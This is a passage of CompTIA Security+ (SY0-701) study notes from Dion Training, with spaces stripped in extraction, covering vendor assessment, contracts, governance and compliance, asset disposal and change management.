+carstomedicaldevicesanddefensesystems○ SafeguardingAgainstSupplyChainAttacks■ VendorDueDiligence● Rigorousevaluationofvendorcybersecurityandsupplychainpractices■ RegularMonitoring&Audits● Continuousmonitoringandperiodicauditsofsupplychainstodetect
+
+suspiciousactivities■ EducationandCollaboration● Sharingthreatinformationandbestpracticeswithintheindustry● Collaboratingwithorganizationsandindustrygroupsforjointdefense
+
+119https://www.DionTraining.com
+
+## Page 120
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ IncorporatingContractualSafeguards● Embeddingcybersecurityclausesincontractswithsuppliersorservice
+
+providers● Ensuringadherencetosecuritystandardswithlegalrepercussionsfor
+
+non-compliance
+
+● VendorAssessment○ VendorAssessments■ Processtoevaluatethesecurity,reliability,andperformanceofexternalentities■ Crucialduetointerconnectivityandpotentialimpactonmultiplebusinesses○ EntitiesinVendorAssessment■ Vendors● Providegoodsorservicestoorganizations■ Suppliers● Involvedinproductionanddeliveryofproductsorparts■ ManagedServiceProviders(MSPs)● ManageITservicesonbehalfoforganizations○ PenetrationTestingofSuppliers■ PenetrationTesting● Simulatedcyberattackstoidentifyvulnerabilitiesinsuppliersystems■ Validatessupplier'scybersecuritypracticesandpotentialriskstoyour
+
+- rganization○ Right-to-AuditClause■ Contractprovisionallowingorganizationstoevaluatevendor'sinternalprocesses
+forcompliance■ Ensurestransparencyandadherencetostandards
+
+120https://www.DionTraining.com
+
+## Page 121
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ InternalAudits■ Vendor'sself-assessmentofpracticesagainstindustryororganizational
+
+requirements■ Demonstratescommitmenttosecurityandquality○ IndependentAssessments■ Evaluationsconductedbythird-partyentitieswithoutastakeintheorganization
+
+- rvendor■ Providesaneutralperspectiveonadherencetosecurityorperformance
+standards○ SupplyChainAnalysis■ Assessmentofanentirevendorsupplychainforsecurityandreliability■ Ensuresintegrityofthevendor'sentiresupplychain,includingsourcesofpartsor
+
+products
+
+● VendorSelectionandMonitoring○ VendorSelectionProcess■ Similartohiringateammember■ Duediligence● Arigorousevaluationthatgoesbeyondsurface-levelcredentials● Includesthefollowing○ Evaluatingfinancialstability○ Operationalhistory○ Clienttestimonials○ On-the-groundpracticestoensureculturalalignment■ Checkforconflictsofinterestthatcouldbiastheselectionprocess
+
+121https://www.DionTraining.com
+
+## Page 122
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ VendorQuestionnaires■ Comprehensivedocumentsfilledoutbypotentialvendors■ Vendorquestionnairesprovideinsightsintooperations,capabilities,and
+
+compliance■ Standardizedcriteriaforfairandinformeddecision-making○ RulesofEngagement■ Guidelinesforinteractionbetweenorganizationandvendors■ Covercommunicationprotocols,datasharing,andnegotiationboundaries■ Ensureproductiveandcompliantinteractions○ VendorMonitoring■ Mechanismusedtoensurethatthechosenvendorstillalignswithorganizational
+
+needsandstandards■ Performancereviewsassessdeliverablesagainstagreed-uponstandardsand
+
+- bjectives■ Feedbackloops● Involveatwo-waycommunicationchannelwhereboththeorganization
+andthevendorsharefeedback
+
+● ContractsandAgreements○ TypesofContractsandAgreements■ BasicContract● Versatiletoolthatformallyestablishesarelationshipbetweentwoparties● Definesroles,responsibilities,andconsequencesfornon-compliance● Specifiestermslikepaymentstructure,deliverytimelines,andproduct
+
+specifications
+
+122https://www.DionTraining.com
+
+## Page 123
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ ServiceLevelAgreement(SLA)● Definesthestandardofserviceaclientcanexpectfromaprovider● Includesperformancebenchmarksandpenaltiesfordeviations■ MemorandumofAgreement(MOA)andMemorandumofUnderstanding(MOU)● MOA○ Formal,outlinesspecificresponsibilitiesandroles● MOU○ Lessbinding,expressesmutualintentwithoutdetailedspecifics■ MasterServiceAgreement(MSA)● Coversgeneraltermsofengagementacrossmultipletransactions● Usedforrecurringclientrelationships,supplementedbyStatementsof
+
+Work■ StatementofWork(SOW)● Specifiesprojectdetails,deliverables,timelines,andmilestones● Providesin-depthproject-relatedinformation■ Non-DisclosureAgreement(NDA)● Ensuresconfidentialityofsensitiveinformationsharedduring
+
+negotiations● Commitmenttoprivacy,protectingproprietarydata■ BusinessPartnershipAgreement(BPA)orJointVentureAgreement(JV)● Goesbeyondbasiccontractswhentwoentitiescollaborate● Outlinespartnershipnature,profit-sharing,decision-making,andexit
+
+strategies● Definesownershipofintellectualpropertyandrevenuedistribution
+
+123https://www.DionTraining.com
+
+## Page 124
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+GovernanceandCompliance
+
+Objectives:● 5.1-Summarizeelementsofeffectivesecuritygovernance● 5.4-Summarizeelementsofeffectivesecuritycompliance
+
+● GovernanceandCompliance○ Governance■ OverallmanagementofITinfrastructure,policies,procedures,andoperations■ Framework● Alignswithorganizationalobjectivesandregulatoryrequirements■ CrucialAspects● RiskManagement○ Identify,assess,andmanagepotentialrisks● StrategicAlignment○ EnsureITstrategyalignswithbusinessobjectives● ResourceManagement○ EfficientandeffectiveuseofITresources● PerformanceMeasurement○ MechanismsformeasuringandmonitoringtheperformanceofIT
+
+processes○ Compliance■ Adherencetolaws,regulations,standards,andpolicies
+
+124https://www.DionTraining.com
+
+## Page 125
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Importance● LegalObligations○ Non-complianceleadstopenalties(fines,sanctions)● TrustandReputation○ Complianceenhancesreputationandfosterstrust● DataProtection○ Preventsbreachesandprotectsprivacy● BusinessContinuity○ Ensuresoperationindisastersordisruptions○ GovernanceStructures■ Boards,Committees● Keyelementsinorganizationalstructure■ GovernmentEntities● Externalentitiesinfluencinggovernance■ CentralizedvsDecentralized● Explanationoforganizationalstructures○ Policies■ High-levelguidelinesindicatingorganizationalcommitments■ TopicsCovered● AcceptableUsePolicies● InformationSecurityPolicies● BusinessContinuity● DisasterRecovery● IncidentResponse● ChangeManagement● SoftwareDevelopmentLifecycle(SDLC)
+
+125https://www.DionTraining.com
+
+## Page 126
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Standards■ Specific,mandatoryactionsorrulesadheringtopolicies■ CoveredStandards● PasswordStandards● AccessControlStandards● PhysicalSecurityStandards● EncryptionStandards○ Procedures■ Step-by-stepinstructionsensureconsistencyandcompliance■ CoveredProcedures● ChangeManagementProcedures● OnboardingandOffboardingProcedures● Playbooks○ ComplianceCoverage■ MonitoringandReporting● Conceptslikeduediligence,duecare,attestation,andacknowledgment■ InternalandExternalCompliance● Differentiatingfactors■ AutomationinCompliance● Utilizingautomationinthecomplianceprocess○ ConsequencesofNon-compliance■ Fines,Sanctions● Legalpenalties■ ReputationalDamage● Impactontrustandreputation
+
+126https://www.DionTraining.com
+
+## Page 127
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ LossofLicense,ContractualImpacts● Severeconsequences
+
+● Governance○ Governance■ PartoftheGRCtriad(Governance,Risk,andCompliance)■ Strategicleadership,structures,andprocessesensuringITalignswithbusiness
+
+- bjectives■ Involvesriskmanagement,resourceallocation,andperformancemeasurement○ PurposeofGovernance■ Establishesastrategicframeworkaligningwithobjectivesandregulations■ Definesrules,responsibilities,andpracticesforachievinggoalsandmanagingIT
+resources○ InfluenceonITComponents■ Shapesguidelinesforrecommendedapproachesinhandlingsituations■ Drivespolicydevelopment,outliningorganizationalcommitments(e.g.,data
+
+protection)■ Impactsstandards,definingmandatoryrulesforpolicyadherence■ Ensuresproceduresalignwithobjectives,providingtask-specificguidance○ AdaptationandRevision■ Governancemustadapttotechnologicaladvancements,regulatorychanges,and
+
+industrycultureshifts■ Monitoringevaluatesgovernanceeffectivenessandidentifiesgaps■ Revisionupdatesgovernanceframework
+
+127https://www.DionTraining.com
+
+## Page 128
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● GovernanceStructures○ OrganizationalGovernance■ Complex,multifacetedconceptessentialforsuccessfulorganizationoperation■ Comprisesvariouscomponents,eachwithuniquefunctions○ GovernanceStructures■ Boards● Electedbyshareholderstooverseeorganizationmanagement● Responsibleforsettingstrategicdirection,policies,andmajordecisions■ Committees● Subgroupsofboardswithspecificfocuses● Allowsdetailedattentiontocomplexareas■ GovernmentEntities● Playrolesingovernance,especiallyforpublicandregulatedorganizations● Establishlawsandregulationsforcompliance■ CentralizedandDecentralizedStructures● Centralized○ Decision-makingauthorityattopmanagementlevels○ Ensuresconsistentdecisionsandclearauthority○ Slowerresponsetolocal/departmentalneeds● Decentralized○ Decision-makingauthoritydistributedthroughoutthe
+
+- rganization○ Enablesquickerdecisionsandlocalresponsiveness○ Potentialforinconsistencies
+128https://www.DionTraining.com
+
+## Page 129
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Policies○ AcceptableUsePolicy(AUP)■ Documentthatoutlinesthedo'sanddon'tsforuserswheninteractingwithan
+
+- rganization'sITsystemsandresources■ DefinesappropriateandprohibiteduseofITsystems/resources■ Aimstoprotectorganizationsfromlegalissuesandsecuritythreats○ InformationSecurityPolicies■ Cornerstoneofanorganization'ssecurity■ Outlineshowanorganizationprotectsitsinformationassetsfromthreats,both
+internalandexternal■ Thesepoliciescoverarangeofareas● DataClassification● AccessControl● Encryption● PhysicalSecurity■ Ensuresconfidentiality,integrity,andavailabilityofdata○ BusinessContinuityPolicy■ Ensuresoperationscontinueduringandafterdisruptions■ Focusesoncriticaloperationcontinuationandquickrecovery■ Includesstrategiesforpoweroutages,hardwarefailures,anddisasters○ DisasterRecoveryPolicy■ FocusesonITsystemsanddatarecoveryafterdisasters■ Outlinesdatabackup,restoration,hardware/softwarerecovery,andalternative
+
+locations○ IncidentResponsePolicy■ Addressesdetection,reporting,assessment,response,andlearningfrom
+
+129https://www.DionTraining.com
+
+## Page 130
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+securityincidents■ Specifiesincidentnotification,containment,investigation,andpreventionsteps■ Minimizesdamageanddowntimeduringincidents○ SoftwareDevelopmentLifecycle(SDLC)Policy■ Guidessoftwaredevelopmentstagesfromrequirementstomaintenance■ Includessecurecodingpractices,codereviews,andtestingstandards■ Ensureshigh-quality,securesoftwaremeetinguserneeds○ ChangeManagementPolicy■ GovernshandlingofITsystem/processchanges■ Ensurescontrolled,coordinatedchangeimplementationtominimizedisruptions■ Coverschangerequest,approval,implementation,andreviewprocesses
+
+● Standards○ Standards■ Providesaframeworkforimplementingsecuritymeasures,ensuringthatall
+
+aspectsofanorganization'ssecuritypostureareaddressed○ PasswordStandards■ Definepasswordcomplexityandmanagement■ Includelength,charactertypes,regularchanges,andpasswordreuserules■ Emphasizepasswordhashingandsaltingforsecurity○ AccessControlStandards■ Determinewhohasaccesstoresourceswithinanorganization■ Includeaccesscontrolmodelslike● DiscretionaryAccessControl(DAC)● MandatoryAccessControl(MAC)● RoleBasedAccessControl(RBAC)
+
+130https://www.DionTraining.com
+
+## Page 131
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Enforceprinciplesofleastprivilegeandseparationofduties○ PhysicalSecurityStandards■ Coverphysicalmeasurestoprotectassetsandinformation■ Includecontrolslikeperimetersecurity,surveillancesystems,andaccesscontrol
+
+mechanisms■ Addressenvironmentalcontrolsandsecureareasforsensitiveinformation○ EncryptionStandards■ Ensuredataremainssecureandunreadableevenifaccessedwithout
+
+authorization■ IncludeencryptionalgorithmslikeAESorRSA■ Dependsontheusecaseandbalancebetweensecurityandperformance
+
+● Procedures○ Procedures■ Systematicsequencesofactionsorstepstakentoachieveaspecificoutcomein
+
+anorganization■ Ensuresconsistency,efficiency,andcompliancewithstandards○ ChangeManagement■ Systematicapproachtohandlingorganizationalchanges■ Itaimstoimplementchangessmoothlyandsuccessfullywithminimaldisruption■ KeyStages● Identifyingtheneedforchange● Assessingimpacts● Developingaplan● Implementation● Post-changereview
+
+131https://www.DionTraining.com
+
+## Page 132
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ OnboardingandOffboardingProcedures■ Onboardingintegratesnewemployeesintotheorganization● ensuresproductivityandengagement● Includesorientation,training,andintegrationactivities■ Offboardingmanagesthetransitionwhenanemployeeleaves● Tasksincludepropertyretrieval,accessdisabling,andexitinterviews○ Playbooks■ Detailedguidesforspecifictasksorprocesses■ Theyprovidestep-by-stepinstructionsforconsistentandefficientexecution■ Usedinvarioussituations,fromcybersecurityincidentstocustomercomplaints■ Includeresourcerequirements,stepstobetaken,andexpectedoutcomes
+
+● GovernanceConsiderations○ RegulatoryConsiderations■ Organizationsmustcomplywithvariousregulations,dependingonindustryand
+
+location■ Regulationscoverareassuchas● DataProtection● Privacy● EnvironmentalStandards● LaborLaws■ Non-complianceleadstopenalties,sanctions,andreputationaldamage○ LegalConsiderations■ Complementregulatoryconsiderations,encompassingcontract,intellectual
+
+property,andcorporatelaw■ Employmentlawsaddressminimumwage,overtime,safety,discrimination,and
+
+132https://www.DionTraining.com
+
+## Page 133
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+benefits■ Litigationrisksincludebreachofcontract,productliability,andemployment
+
+disputes■ Robustlegalstrategiesandresourcesareneededtomanagelegalrisks○ IndustryConsiderations■ Refertoindustry-specificstandards,practices,andethicalguidelines■ Notlegallybindingbutinfluencecustomer,partner,andregulatorexpectations■ Non-adoptionmayleadtocompetitivedisadvantagesandstakeholdercriticism○ GeographicalConsiderations■ Geographicalregulationsimpactorganizationsatlocal,regional,national,and
+
+globallevels■ Localconsiderationsincludecityordinances,zoninglaws,andoperational
+
+restrictions■ Regionalconsiderations,likeCCPAinCalifornia,imposestate-levelregulations■ Nationalconsiderations,e.g.,ADAintheUS,affectbusinessesacrosstheentire
+
+country■ Globalconsiderations,likeGDPR,applyextraterritoriallytoorganizationsdealing
+
+withEUcitizens'data■ Conflictoflawsbetweenjurisdictionsisasignificantchallenge■ Navigatingthesedifferencesrequiresdeeplegalknowledgeandflexibilityin
+
+governance
+
+● Compliance○ Compliance■ Ensuresadherencetolaws,regulations,guidelines,andspecifications■ Includescompliancereportingandcompliancemonitoring
+
+133https://www.DionTraining.com
+
+## Page 134
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ComplianceReporting■ Systematicprocessofcollectingandpresentingdatatodemonstrateadherence
+
+tocompliancerequirements■ TwoTypesofComplianceReporting● InternalComplianceReporting○ Ensuresadherencetointernalpoliciesandprocedures○ Conductedbyaninternalauditteamorcompliancedepartment● ExternalComplianceReporting○ Demonstratescompliancetoexternalentities○ Mandatory,oftenbylaworcontract○ ComplianceMonitoring■ Regularlyreviewsandanalyzesoperationsforcompliance■ Includesduediligenceandduecare,attestationandacknowledgement,and
+
+internalandexternalmonitoring○ DueDiligenceandDueCare■ DueDiligence● Identifyingcompliancerisksthroughthoroughreview■ DueCare● Mitigatingidentifiedrisks○ AttestationandAcknowledgement■ Attestation● Formaldeclarationbyaresponsiblepartythattheorganization’s
+
+processesandcontrolsarecompliant■ Acknowledgement● Recognitionandacceptanceofcompliancerequirementsbyallrelevant
+
+parties
+
+134https://www.DionTraining.com
+
+## Page 135
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ InternalandExternalMonitoring■ InternalMonitoring● Regularlyreviewinganorganization’soperationstoensure compliance
+
+withinternalpolicies■ ExternalMonitoring● Third-partyreviewsforcompliancewithexternalregulationsorstandards○ RoleofAutomationinCompliance■ Streamlinesdatacollection,improvesaccuracy,andprovidesreal-time
+
+monitoring
+
+● Non-complianceConsequences○ ComplianceinITisessentialtoavoidsevereconsequences○ Consequencesofnon-complianceinclude■ Fines● Monetarypenaltiesimposedbyregulatorybodies■ Sanctions● Strictmeasuresbyregulatorybodiestoenforcecompliance● Rangefromrestrictionstobans■ ReputationalDamage● Negativeimpactonacompany'sreputation● Significantandlong-lastingintheageofsocialmedia■ LossofLicense● Lossoftherighttooperate,relevantinregulatedindustries■ ContractualImpacts● Breachofcontractsduetonon-compliancewithlawsandregulations● Canleadtolegaldisputes,financialpenalties,orcontracttermination
+
+135https://www.DionTraining.com
+
+## Page 136
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Toavoidtheseconsequences,companiesshouldprioritizecomplianceby■ Understandingandadheringtorelevantlawsandregulations■ Implementingrobustcybersecuritymeasures■ Regularlyreviewingandupdatingcomplianceprograms
+
+136https://www.DionTraining.com
+
+## Page 137
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+AssetandChangeManagement
+
+Objectives:● 1.3-Explaintheimportanceofchangemanagementprocessesandtheimpacttosecurity● 4.1-Givenascenario,youmustbeabletoapplycommonsecuritytechniquestocomputing
+
+resources● 4.2-Explainthesecurityimplicationsofproperhardware,software,anddataasset
+
+management
+
+● AssetandChangeManagement○ AssetManagement■ Systematicprocessofdeveloping,operating,maintaining,andsellingassets
+
+cost-effectively○ ChangeManagement■ Structuredapproachtotransitioningfromacurrentstatetoadesiredfuture
+
+state○ AcquisitionandProcurement■ Structuredprocessofsourcing,vetting,andobtainingsecuritytechnologiesand
+
+services○ MobileAssetDeployments■ DeploymentModels● BYOD● COPE● CYOD
+
+137https://www.DionTraining.com
+
+## Page 138
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ AssetManagement■ Assignment/AccountingandMonitoring/AssetTracking● Clearownershipandclassificationofassets● RigorousmonitoringthroughinventorychecksandMDMsolutions○ AssetDisposalandDecommissioning■ Processes● Sanitization,destruction,certification,dataretention● Minimizestheriskofunauthorizedaccessordatabreaches○ ChangeManagementImportance■ ApprovalProcess● Strictapprovalforeverychange● ConsiderationofCABinsights,ownership,stakeholderinvolvement,and
+
+impactanalysis○ ChangeManagementProcesses■ BestPractices● Schedulemaintenancewindows● Thoroughbackoutplans● Consistenttestingpost-implementation○ TechnicalImplicationsofChanges■ ManagementAspects● Allowlists,denylists● Handlingdowntime,restarts● Managinglegacyapplicationsanddependencies○ DocumentingChanges■ Importance● Versioncontrollingchanges
+
+138https://www.DionTraining.com
+
+## Page 139
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Regularlyupdatingdiagrams,policies,andprocedures● Updatingchangerequestsortroubleticketspost-implementation
+
+● AcquisitionandProcurement○ Acquisition■ Processofobtaininggoodsandservices○ Procurement■ Entireprocessofsourcingandobtainingthosegoodsandservices,includingall
+
+theprocessesthatleaduptotheacquisition○ Conductingtheacquisitionandprocurementprocess■ Understandthedifferenttypesofpurchaseoptions● CompanyCreditCard○ Quickpurchaseoflow-costitems○ Transactionlimitsanditemrestrictions● IndividualPurchase○ Employeepurchases,seeksreimbursement○ Usedinemergenciesorwhennocompanycreditcardisavailable● PurchaseOrder○ Formaldocumentissuedbythepurchasingdepartment○ Forlarger,moreexpensivepurchases○ Dictatespaymentterms(NET15,NET30,NET60)○ InternalApprovalProcess■ Ensurespurchasealignmentwithcompanygoals■ Validatesbudgetallocation■ Assessessecurityandcompatibilitywithexistinginfrastructure
+
+139https://www.DionTraining.com
+
+## Page 140
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Post-ApprovalProcurement■ Productcompatibilityassessment■ Securitychecksandconfigurations■ Usertraining■ Integrationintotheexistingworkflow
+
+● MobileAssetDeployments○ ThreeMainMobileDeviceDeploymentModels■ BYOD(BringYourOwnDevice)● Employeesusepersonaldevicesforwork● Cost-effectiveforemployers● Drawbacksincludereducedcontroloversecurityanddevicemanagement■ COPE(Corporate-Owned,PersonallyEnabled)● Thecompanyprovidesdevicesforemployees● Greatercontroloversecurityandstandards● Higherinitialinvestment● Employeesmayhaveprivacyconcernsorneedtocarrytwodevices■ CYOD(ChooseYourOwnDevice)● Employeesselectdevicesfromacompany-approvedlist● Balancebetweenemployeechoiceandorganizationalcontrol● SimilardrawbackstoCOPEintermsofinitialcostandpotentialprivacy
+
+concerns○ SelectingtheRightModel■ Considerthespecificneeds,budgetconstraints,andriskappetiteofyour
+
+- rganization
+140https://www.DionTraining.com
+
+## Page 141
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Analyzecosts,security, andemployeesatisfaction● BYODmayhavehiddencostsforsecurityandcompatibility● COPEoffersmorecontroloverdevicesandsupportsMDM● CYODprovidesabalancebetweenflexibilityandcontrol
+
+● AssetManagement○ AssetManagement■ Systematicapproachtogoverningandmaximizingthevalueofitemsanentityis
+
+responsibleforthroughouttheasset’slifecycle● TangibleAssets○ Officebuildings○ Computers○ Machinery● IntangibleAssets○ Intellectualproperty○ Organization’sreputation○ Goodwill○ AssignmentandAccountingofAssets■ Eachassetassignedtoapersonorgroup,knownasowners■ Processreferredtoastheallocationorassignmentofownership■ Avoidsambiguity,aidstroubleshooting,upgrades,andreplacements○ ClassificationandCategorization■ Assetsshouldbeclassifiedandcategorized■ Classificationbasedoncriteriasuchasfunctionandvalue■ Informsmaintenance,replacement,orretirementdecisions■ High-valueassetsmayrequirestringentmaintenanceschedules
+
+141https://www.DionTraining.com
+
+## Page 142
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Low-valueassetsmaybeconsideredforrecyclingordisposal○ MonitoringandTrackingofAssets■ Ensuresproperaccountingandoptimaluseofassets● AssetMonitoring○ Maintaininganinventorywithspecifications,location,and
+
+assignedusers● AssetTracking○ Goesbeyondmonitoring,involvingthelocation,status,and
+
+conditionofassetsusingspecializedsoftwareandtracking
+
+technologies● Enumeration○ Identifiesandcountsassets,especiallyinlargeorganizationsor
+
+duringtimesofassetprocurementorretirement○ Aidsinmaintaininganaccurateinventory■ Proactiveapproachforriskmanagementandresourceoptimization○ MobileDeviceManagement(MDM)■ Managesandtracksmobiledevices● Smartphones● Tablets● Laptops● Wearables■ Centralizesmanagement,enforcescorporatepolicies,ensuressoftware
+
+uniformity,safeguardssensitivedata■ Enablesremotelockandwipeoflostdevices,remotesoftwareupdates,and
+
+consistentuserexperiences■ Reducesrisksassociatedwithunsecuredoroutdateddevices
+
+142https://www.DionTraining.com
+
+## Page 143
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● AssetDisposalandDecommissioning○ AssetDisposalandDecommissioning■ Necessitytomanagethedisposalofoutdatedassets○ NISTSpecialPublication800-88(GuidelinesforMediaSanitization)■ Providesguidanceonassetdisposalanddecommissioning○ Sanitization■ Thoroughprocesstomakedatainaccessibleandirretrievablefromstorage
+
+mediumusingtraditionalforensicmethods■ Appliestovariousstoragemedia■ Methodsinclude● Overwriting○ Replacingtheexistingdataonastoragedevicewithrandombits
+
+- finformationtoensurethattheoriginaldataisobscured○ Repeatedseveraltimestoreduceanychanceoftheoriginaldata
+beingrecovered○ Overwritingcanuseasinglepass,7passes,or35passes● Degaussing○ Utilizesamachinecalledadegaussertoproduceastrong
+
+magneticfieldthatcandisruptmagneticdomainsonstorage
+
+deviceslikeharddrivesortapes○ Rendersdataonthestoragemediumunreadableandirretrievable○ Permanenterasureofdatabutmakesthedeviceunusable○ Afterdegaussing,adevicecannolongerbeusedtostoredata● SecureErase○ Deletesdataandensuresitcan'tberecovered
+
+143https://www.DionTraining.com
+
+## Page 144
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Implementedinfirmwarelevelofstoragedevices○ Built-inerasureroutinepurgesalldatablocks○ Deprecatedinfavorofcryptographicerase● CryptographicErase(CE)○ Utilizesencryptiontechnologiesfordatasanitization○ Destroysordeletesencryptionkeys,renderingdataunreadable○ Quickandefficientmethodofsanitization○ Supportsdevicerepurposingwithoutdataleakage○ Destruction■ Goesbeyondsanitization,ensuresphysicaldeviceisunusable■ Recommendedmethods● Shredding● Pulverizing● Melting● Incinerating■ Usedforhigh-securityenvironments,especiallywithSecretorTopSecretdata○ Certification■ Actsasproofthatdataorhardwarehasbeensecurelydisposedof■ Importantfororganizationswithregulatoryrequirements■ Createsanauditlogofsanitization,disposal,ordestruction○ DataRetention■ Strategicallydecidingwhattokeepandforhowlong■ Datahasalifecyclefromcreationtodisposal■ Reasonstoretaindata● Regulatoryrequirements● Historicalanalysis
+
+144https://www.DionTraining.com
+
+## Page 145
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Trendprediction● Disputeresolution■ Retainingeverythingisnotfeasibleduetocostsandsecurityrisks● Themoreyoustore,themoreyoumustsecure■ Clutterandexcessivedatarequireadditionalsecuritymeasures○ DataProtection■ Alldataneedsprotectionfrompotentialdatabreaches■ Moredatarequiresmoreextensivesecuritymeasures■ Leadstohighercostsandresourceallocation■ Excessivedatacomplicatesretrievalandanalysis
+
+● ChangeManagement○ ChangeManagement■ Orchestratedstrategytotransitionteams,departments,andorganizationsfrom
+
+existingstatetoamoredesirablefuturestate● Necessaryinmodernbusinessenvironmentsduetoconstantchanges● Changeisessentialbutrequires○ Precision○ Planning○ Structuredapproach● Ensureschangesareproperlycontrolled,planned,andintegratedtoavoid
+
+disruptions○ ChallengesofChange■ Unplannedorpoorlycoordinatedchangescanleadtoresistanceandconfusion■ Evenseeminglysimplechanges,likesoftwareupgrades,cancauseissues■ Existingprocessesbecomedisruptedbychanges,impactingefficiency
+
+145https://www.DionTraining.com
+
+## Page 146
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ChangeApprovalandAssessment■ Changesmustbeapprovedandassessed■ Organizationalprocessesandproceduresforchangeapproval■ Assessmentevaluatesvalueandpotentialdisruptions■ ChangeAdvisoryBoard(CAB)● Bodyofrepresentativesfromvariouspartsofanorganizationthatis
+
+responsibleforevaluationofanyproposedchanges● Evaluatesproposedchangesbeforeapproval,assessesviability,impacts,
+
+andalignmentwithobjectives○ ChangeOwner■ Individualorteamresponsibleforinitiatingchangerequest■ Advocatesforthechange,detailsreasons,benefits,andchallenges■ Keyinpresentingthecaseforthechange○ Stakeholders■ Individualsorteamswithavestedinterestintheproposedchange■ Directlyimpactedorinvolvedinassessmentandimplementation■ Theseindividualsorteamsmustbe● Consulted● Theirfeedbackconsidered● Theirconcernsaddressed■ Includetechnical,business,andend-userstakeholders○ ImpactAnalysis■ IntegralpartoftheChangeManagementprocess■ Essentialbeforeimplementingproposedchanges■ Assessespotentialfallout,immediateeffects,long-termimpacts■ Identifieschallengesandpreparesformaximizingbenefits
+
+146https://www.DionTraining.com
+
+## Page 147
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● ChangeManagementProcesses○ FiveMainStepsinChangeManagement■ PreparingfortheChange● Understandthecurrentstateandneedfortransition● Assessexistingprocessesandidentifyinefficienciesandchallenges● Gathernecessaryresources,engagestakeholders,andensurereadiness.■ CreatingaVisionfortheChange● Craftaclearandcompellingvisionforchange● Definingthefollowing○ Desiredfuturestate○ Reasonsforthechange○ Successcriteria● Inspireenthusiasmandbuy-inacrossstakeholders■ ImplementingtheChange● Puttheplanintoaction,whichmayinvolve○ Training○ Restructuring,○ Introducingnewtools● Maintaincontinuouscommunicationwithstakeholders● Addressconcernsandbeopentofeedbacktoreduceresistance■ VerifyingtheChange● Measuretheeffectivenessandensuredesiredoutcomesareachieved● Itmightrequirethefollowing○ Surveys○ Metricsanalysis
+
+147https://www.DionTraining.com
+
+## Page 148
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Stakeholderinterviews● Addressdiscrepanciesorissuestorefineandoptimizetheprocess■ DocumentingtheChange● Maintainhistoricalrecordsofimplementedchanges● Capturelessonslearnedforfuturereference● Reflectonpastinitiativesandimprovechangemanagementpractices○ KeyAspectsoftheChangeManagementProcess■ ScheduledMaintenanceWindow● Designatedtimeframesforimplementingchanges● Reducespotentialdisruptionstodailyoperations● Allowsflexibilityforemergencychanges■ BackoutPlan● Pre-determinedstrategytorevertsystemstotheiroriginalstateincaseof
+
+issuesduringchangeimplementation● Actsasasafetynetforensuringquickreturntonormaloperations■ TestingtheResults● Validatesthesuccessofthechangebyconductingtestsonsystemsand
+
+- perationalprocessesafterimplementation● Ensuresdesiredoutcomesandidentifiesareasneedingfurther
+adjustments
+
+■ StandardOperatingProcedures(SOPs)● Detailedstep-by-stepinstructionsforspecifictasks● Ensuresconsistency,efficiency,andreduceserrorsinchange
+
+implementationwithintheorganization
+
+148https://www.DionTraining.com
+
+## Page 149
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● TechnicalImplicationsofChanges○ TechnicalImplicationsofChanges■ AllowListsandDenyLists● AllowList○ Specifiesentitiespermittedtoaccessaresource● DenyList○ Listsentitiespreventedfromaccessingaresource● Reviewbothlistswhenproposingchangestopreventunintendedaccess
+
+restrictionsorgrants● Essentialformaintainingsystemfunctionalityandsecurity■ RestrictedActivities● Certaintaskslabeledas'restricted'duetotheirimpactonsystemhealth
+
+- rsecurity● Verifyproposedchangesforanyrestrictedactivities● Preventdatabreachesandoperationaldisruptionsbyunderstanding
+restrictions■ Downtime● Anychange,evenminor,carriestheriskofcausingdowntime● Estimatepotentialdowntimeandassessitsnegativeeffectsagainst
+
+benefits● Schedulechangesduringmaintenancewindowstominimizeimpactson
+
+endusers■ ServiceandApplicationRestarts● Somechanges,likeinstallingsecuritypatches,requireserviceor
+
+applicationrestarts● Restartingcriticalservicescanbedisruptive,potentiallycausingdataloss
+
+149https://www.DionTraining.com
+
+## Page 150
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+- rbacklog● Considertheimplicationsofrestarts,especiallyforkeyservers■ LegacyApplications● Oldersoftwareorsystemsstillinuseduetofunctionalityanduserneeds● Legacyapplicationsarelessflexibleandmoresensitivetochanges● Minorupdatescanleadtomalfunctionsorcrashes,soassesstheir
+compatibility.■ Dependencies● Interconnectedsystemscreatedependencies,wherechangesinonearea
+
+affectothers● Mappingdependenciesiscrucialbeforeimplementingchanges● Preventscascadingeffects,outages,ordisruptionsinvariouspartsof
+
+yournetwork
+
+● DocumentingChanges○ Documentingchangesprovidesaclearhistoryofthewhat,when,andwhyfor
+
+accountabilityandfuturereference○ VersionControl■ Tracksandmanageschangesindocuments,software,andotherfiles■ Allowsmultipleuserstocollaborateandreverttopreviousversionswhen
+
